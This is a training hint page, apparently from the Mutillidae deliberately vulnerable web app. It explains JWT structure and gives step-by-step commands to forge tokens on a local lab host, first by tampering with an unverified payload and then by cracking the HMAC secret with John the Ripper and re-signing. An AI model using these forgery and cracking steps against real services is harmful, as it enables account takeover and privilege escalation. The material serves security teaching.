<p>
	<span class="report-header">Overview</span>
</p>

<p>
	A JSON Web Token (JWT) structure consists of a header, payload, and signature delimited by periods.
	Each part is Base64URL encoded. The header and payload are JSON formatted strings. The signature is calculated
	based on the algorithm specified in the header and used to prevent tampering.
</p>

<p>
	<a href="https://tools.ietf.org/html/rfc7519">JSON Web Token RFC</a>
</p>

<p style="word-break: break-all">
	<font color="red">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</font>.<font color="purple">eyJpc3MiOiJodHRwOlwvXC9tdXRpbGxpZGFlLmxvY2FsIiwiYXVkIjoiaHR0cDpcL1wvbXV0aWxsaWRhZS5sb2NhbCIsImlhdCI6MTYxNDY5NTk4MiwiZXhwIjoxNjE0Njk3NzgyLCJ1c2VyaWQiOiIyNCJ9</font>.<font color="blue">6AS1qiJ9S7eagJQeQVDSpoMN2BZHCVpgDeN85Yn2UWk</font>
</p>

<p>
	Red = Header<br/>
	Purple = Payload<br/>
	Blue = Signature<br/>
</p>

<p>
	The header identifies which algorithm is used to generate the signature.
	Example: {"typ":"JWT","alg":"HS256"}
</p>

<p>
The data in the payload is application dependent, but often contains some standard claims such as Issuer (iss), subject (sub), expiration time (exp), and issued at (iat).
</p>

<span class="report-header">Discovery Methodology</span>
<p>
	Inspect requests and responses for Base64 encoded data separated by periods. BurpSuite extensions such as "JSON Web Token Attacker" and "JSON Web Tokens" can help automate discovery and attacks.
</p>

<span class="report-header">Exploitation (Level 0) - Test Signature Verification</span>
<p>
	If the server does not validate the signature an attacker may modify values in the token.
	Base64 decode the header and payload of the token, alter values, re-encode, and re-submit the request.
</p>

<code>
	echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9tdXRpbGxpZGFlLmxvY2FsIiwiYXVkIjoiaHR0cDpcL1wvbXV0aWxsaWRhZS5sb2NhbCIsImlhdCI6MTYxNDc4MTcwMCwiZXhwIjoxNjE0NzgzNTAwLCJ1c2VyaWQiOiIyNCJ9.2tkqvTgkNm4k8-L9MTIVIo7fdT1R53R_g7SO5QUCaFE' | cut -d. -f1 | base64 -d

	Result: {"typ":"JWT","alg":"HS256"}

	echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9tdXRpbGxpZGFlLmxvY2FsIiwiYXVkIjoiaHR0cDpcL1wvbXV0aWxsaWRhZS5sb2NhbCIsImlhdCI6MTYxNDc4MTcwMCwiZXhwIjoxNjE0NzgzNTAwLCJ1c2VyaWQiOiIyNCJ9.2tkqvTgkNm4k8-L9MTIVIo7fdT1R53R_g7SO5QUCaFE' | cut -d. -f2 | base64 -d

	Result: {"iss":"http:\/\/mutillidae.local","aud":"http:\/\/mutillidae.local","iat":1614781700,"exp":1614783500,"userid":"24"}
</code>
<p>
	Alter the value of the userid field and base64url encode:
</p>
<code>
	echo -n '{"iss":"http:\/\/mutillidae.local","aud":"http:\/\/mutillidae.local","iat":1614781700,"exp":1614783500,"userid":"1"}' | base64 -w0

	Result: eyJpc3MiOiJodHRwOlwvXC9tdXRpbGxpZGFlLmxvY2FsIiwiYXVkIjoiaHR0cDpcL1wvbXV0aWxsaWRhZS5sb2NhbCIsImlhdCI6MTYxNDc4MTcwMCwiZXhwIjoxNjE0NzgzNTAwLCJ1c2VyaWQiOiIxIn0=
</code>
<p>
	Replace the payload field of the original token with the new value and resend the request to the server.
</p>
<code>
	Result: {"cid":"1","username":"admin","password":"adminpass","mysignature":"g0t r00t?","is_admin":"TRUE","firstname":"System","lastname":"Administrator"}
</code>
<p></p>

<span class="report-header">Exploitation (Level 1) - Signature Cracking</span>
<p>
	Signatures generated using an HMAC require a secret key. If you can determine the secret key used to generate the signature, you can alter the claims in the payload and re-sign the token yourself.
	John the Ripper and Hashcat support JWT tokens.
</p>
<code>
	echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9tdXRpbGxpZGFlLmxvY2FsIiwiYXVkIjoiaHR0cDpcL1wvbXV0aWxsaWRhZS5sb2NhbCIsImlhdCI6MTYxNDc4NDE3NiwiZXhwIjoxNjE0Nzg1OTc2LCJ1c2VyaWQiOiIyNCJ9.9rMf6Hd17Jwev3Sk2YG2CUzz9uEUOBFfImxYAE_KVpg' > token

	john token

	Using default input encoding: UTF-8
	Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
	Will run 4 OpenMP threads
	Proceeding with single, rules:Single
	Press 'q' or Ctrl-C to abort, almost any other key for status
	Almost done: Processing the remaining buffered candidate passwords, if any.
	Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
	snowman          (?)
	1g 0:00:00:00 DONE 2/3 (2021-03-03 10:10) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..ferrises
	Use the "--show" option to display all of the cracked passwords reliably
	Session completed

</code>

<p>
	Use a custom Python script, online tool, etc. to create a new JWT with altered claims and signed using the discovered secret.
	https://jwt.io/ works well. Replace the token in the request with the new token and resubmit.
</p>

<code>
	New Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vbXV0aWxsaWRhZS5sb2NhbCIsImF1ZCI6Imh0dHA6Ly9tdXRpbGxpZGFlLmxvY2FsIiwiaWF0IjoxNjE0Nzg0MTc2LCJleHAiOjE2MTQ3ODU5NzYsInVzZXJpZCI6IjEifQ.kiTnwqecZE3XJP6I2frMKiDnI10Ajb0gThUFWX2s4tw

	Result: {"cid":"1","username":"admin","password":"adminpass","mysignature":"g0t r00t?","is_admin":"TRUE","firstname":"System","lastname":"Administrator"}
</code>
<br/><br/>
<span id="videos" class="report-header">Videos</span>
<br/>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->JWTSecurityPart1WhatisaJWT); ?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->JWTSecurityPart2HowtoViewJWTinBurpSuite); ?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->JWTSecurityPart3HowTimeoutsWork); ?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->JWTSecurityPart4HowSignaturesProtectAgainstForgery); ?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->JWTSecurityPart5WhyuseCertificatebasedSignatures); ?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->JWTSecurityPart6ImportanceofInputValidation); ?>
